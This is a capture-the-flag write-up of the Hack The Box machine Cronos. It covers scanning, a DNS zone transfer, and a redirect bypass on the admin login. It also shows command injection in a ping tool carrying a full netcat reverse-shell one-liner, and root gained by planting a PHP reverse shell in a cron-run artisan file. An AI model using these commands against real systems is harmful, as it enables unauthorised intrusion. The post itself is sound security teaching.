---
title:     "Hack The Box - Cronos"
tags: [linux,medium,domain,cron,redirection]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/1.png)

We are going to pwn Cronos from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/11>


Like always begin with our Nmap Scan.

## Nmap Scan Results:

```
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 4.8 (92%), Linux 4.9 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP:

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/2.png)
Its an apache2 default webpage.

I edited my ``/etc/hosts`` file to add the machine’s name ``cronos.htb`` and then revisit the page to check it shows any different page.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/3.png)

The server is running ``laravel framework`` every page leads to ``laravel`` releated things.
So I started checking other ports.

## Port 53:

Which is ``domain`` may be we can do a zone transfer for that domain. For that we can use a tool named ``dig``.

> dig - DNS lookup utility

By using this we can find other domains available for the webpage. 
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/4.1.png)

> AXFR, is a type of DNS transaction. It is one of the many mechanisms available for administrators to replicate DNS databases across a set of DNS servers.

Got some new domains, So I added those new entries to ``/etc/hosts``

Started from ``admin.cronos.htb``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/4.png)
Its an Login page!!

Lets bruteforce the directories using ``Gobuster`` to check if anything useful for us.

## Gobuster Results:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://admin.cronos.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/01/16 20:34:34 Starting gobuster
===============================================================
 /index.php (Status: 200)
 /welcome.php (Status: 302)
 /logout.php (Status: 302)
 /config.php (Status: 200)
 /session.php (Status: 302)
 /server-status (Status: 403)
```

When I try to enter ``/welcome.php`` it redirects to ``/login.php`` , So we can stop the redirection and see what that page leads us.<br/>
We can use ``intruder`` from burp to do this process.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/5.png)<br/>
All we need to do is change ``302 Found`` to ``200 Ok``.

For that open ``Proxy -> Options -> Match and Replace``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/6.png)

``/welcome.php`` it leads to a page where it has a tool to ping.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/7.png)

So I tried some normal command injections and  ``&&`` helps to exec another commands.

`` 10.10.14.8 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f ``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/8.png)<br/>
We got the shell

While checking for any useful files in ``/var/www`` found ``/admin.php/config.php``  and its give me ``mysql`` credentials
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/9.png)

I logged in with them to check any user credentials available and found a hash for admin but it takes some time to crack the hash.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/10.png)

## Privilege Escalation:

I uploaded my Enumeration Script to the box and found there is a cronjob running so I uploaded ``pspy`` to see whats actually going on.

>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/11.png)

We have write permission on the on the folder ``/var/www/laravel/``and its running as php so we can create a file with the same name ``artisan`` and upload our php reverse shell.

I created ``artisan`` file in my machine with php reverse shell and uploaded to the box.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/12.png)

Started my Listener and waited for the cronjob to execute my reverse shell
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-cronos/13.png)

Got Root!!